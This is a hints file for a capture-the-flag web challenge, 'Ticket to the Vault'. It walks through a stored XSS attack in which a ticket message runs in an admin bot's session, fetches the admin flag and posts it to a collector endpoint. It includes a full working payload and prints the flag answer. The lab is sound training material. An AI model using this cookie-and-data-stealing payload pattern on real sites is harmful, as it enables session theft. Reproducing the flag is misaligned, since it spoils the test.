# Web-02: Ticket to the Vault - Hints

## Challenge Overview
Exploit XSS to steal The Professor's secrets and access the vault coordinates.

## Key Locations

### 1. Flag Location
- **Endpoint**: `/admin/flag`
- **Access**: Admin only (The Professor)
- **Contains**: `TDHCTF{THE_BOT_DID_THE_DIRTY_WORK} | Key: <challenge-key>`

### 2. Capture Location
- **Endpoint**: `/my-captures`
- **Purpose**: View data exfiltrated from The Professor's session

### 3. Collector Endpoint
- **Endpoint**: `/collector` (POST)
- **Purpose**: Receive exfiltrated data
- **Parameters**: `user_id`, `data`

## Attack Flow

1. **Inject XSS** in a ticket message
2. **Bot visits** `/admin/tickets` (XSS executes in admin context)
3. **XSS fetches** `/admin/flag` 
4. **XSS exfiltrates** to `/collector`
5. **View captured data** at `/my-captures`

## Sample XSS Payload

```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('/collector', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        user_id: YOUR_USER_ID,
        data: flag
      })
    });
  });
</script>
```

Replace `YOUR_USER_ID` with your actual user ID (check your profile or captures page).

## Expected Result

After the bot processes your ticket, check `/my-captures` to see:
```
TDHCTF{THE_BOT_DID_THE_DIRTY_WORK} | Key: <challenge-key-value>
```

## Notes

- The bot runs every 8 seconds
- XSS executes in The Professor's (admin) session
- The flag endpoint is only accessible to admin users
- The challenge key is dynamically loaded from `/run/secrets/web-02.key`

